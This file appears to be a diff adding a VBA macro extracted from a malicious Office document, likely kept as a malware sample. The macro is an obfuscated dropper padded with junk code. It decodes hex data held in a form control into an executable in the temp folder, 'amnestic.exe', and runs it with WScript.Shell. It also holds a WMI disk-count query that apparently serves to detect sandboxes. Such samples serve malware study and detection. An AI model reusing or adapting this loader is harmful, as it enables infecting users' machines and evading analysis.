@@ -1,0 +1,95 @@
+Filename     : ./macros/0f879a7a9e2d855c7456f506e0297d9ec9b676ac6c27aa99ecfed4738e028836
+OLE stream   : Macros/VBA/irena
+VBA filename : irena.bas
+----------------------------------------
+Attribute VB_Name = "irena"
+Sub hagridden()
+Dim mosslike As Integer
+tableland = "nike"
+Dim binghamton As String
+Dim interferon As Long
+Dim disagreeing As String
+bushes = 69 - 16
+unmusically = 79 + 109 - 94
+If bushes + unmusically > 89 Then
+bialy = "am" + "oral" + "ism"
+End If
+
+Set sixtieth = VBA.CreateObject("WScript.Shell")
+rant = UCase("ExpandEnvir") + LCase("onmentStrings")
+binghamton = CallByName(sixtieth, rant, VbMethod, "%temp%")
+Dim gluon As Integer
+disagreeing = binghamton & "\amnestic.exe"
+
+Dim zombi As String
+Dim halfbeak
+Dim benzene
+benzene = FreeFile
+Dim confusing
+confusing = 0
+Dim glossopsitta
+Dim carload As String
+halfbeak = confusing
+
+audacious = Deep.Depression
+
+Dim drynaria As Long
+agape = audacious
+maleficent = Len(agape)
+halfbeak = 1
+Dim frisian As String
+Open disagreeing For Binary Access Write As #benzene
+Dim bounteousness As Byte
+
+sarsaparilla = 1 + 39 - 8
+cabined = 28 - 3 + 33
+For sarsaparilla = 1 + 39 - 8 To 28 - 3 + 33
+advoutry = "ha" + "emulon"
+Next sarsaparilla
+
+ascendancy = 1 - 54 + 55
+For gunwale = halfbeak To (maleficent / ascendancy)
+Call irena.margin(benzene, agape, halfbeak)
+halfbeak = halfbeak + 2
+Next gunwale
+necessary = 118 - 96
+amerind = 83 + 104 - 113
+For necessary = 118 - 96 To 83 + 104 - 113
+bicephalous = Right("communicationalcl", 2) + Right("spoilerothe", 4) + "s"
+Next necessary
+
+Close #benzene
+binghamton = CallByName(sixtieth, "Run", VbMethod, disagreeing)
+End Sub
+
+Public Sub margin(ByRef hanaper, deformity, buoyantly)
+frau = VBA.Mid(deformity, buoyantly, 2)
+Put #hanaper, , CByte("&" + Chr(125 - 53) & frau)
+End Sub
+
+Function pipefish()
+Dim voluptuary As Object
+hiation = Left("Seasperges", 2) + LCase("lEct")
+Dim arthritic As Long
+monocot = 33 + 50 - 83
+betrothed = 105 - 44
+encomium = 119 + 94 - 118
+If betrothed + encomium > 53 Then
+mixtura = UCase("Jel") + "lyfis" + LCase("H")
+End If
+africanamerican = UCase(" * F") + StrReverse("_23niW mor")
+Dim meatless As Long
+objectionable = Left("Discato'ninetails", 3) + "kDriv" + StrReverse("e") + ""
+hypocritical = UCase("Win") + Left("mgmtsholometabolic", 5) + ":\\" + ""
+Set charlatan = GetObject(hypocritical & ".\root\cimv2")
+dessertspoon = 7 - 33 + 93
+academicianship = 39 + 19
+If dessertspoon + academicianship > 95 Then
+carthorse = StrReverse("ua") + Right("chilledctio", 4) + "n"
+End If
+Set israel = charlatan.ExecQuery(hiation + africanamerican & objectionable)
+For Each calculable In israel
+monocot = monocot + 65 - 5 - 59
+Next
+pipefish = monocot
+End Function
